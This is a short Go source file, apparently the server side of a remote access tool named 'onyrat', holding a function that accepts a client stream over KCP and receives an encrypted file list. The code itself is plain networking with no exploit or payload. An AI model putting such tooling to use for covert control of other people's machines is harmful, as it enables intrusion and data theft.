//go:build server
// +build server

package files

import (
	"fmt"
	"time"

	"github.com/Onyz107/onyrat/pkg/network"
)

func ReceiveFiles(s *network.KCPServer, c *network.KCPClient) (string, error) {
	stream, err := c.Manager.AcceptStream(fileStream, 10*time.Second)
	if err != nil {
		return "", fmt.Errorf("failed to accept file stream: %w", err)
	}
	defer stream.Close()

	buf := bufPool.Get().([]byte)
	defer bufPool.Put(buf)

	n, err := s.ReceiveEncrypted(stream, buf, 5*time.Second)
	if err != nil {
		return "", fmt.Errorf("failed to receive file list: %w", err)
	}

	return string(buf[:n]), nil
}
